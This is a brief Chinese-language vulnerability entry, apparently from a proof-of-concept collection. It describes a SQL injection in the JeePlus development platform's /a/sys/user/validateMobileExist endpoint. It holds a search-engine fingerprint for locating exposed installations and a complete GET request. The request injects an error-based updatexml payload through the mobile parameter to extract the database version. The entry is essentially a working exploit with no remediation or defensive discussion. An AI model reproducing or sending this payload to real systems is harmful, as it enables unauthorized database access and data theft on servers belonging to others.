# JeePlus快速开发平台-validateMobileExist接口存在SQL注入漏洞

JeePlus ｜ SQL注入 ｜ —
- **指纹**：`app="JeePlus"`
- **请求**：`GET /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+version%28%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1`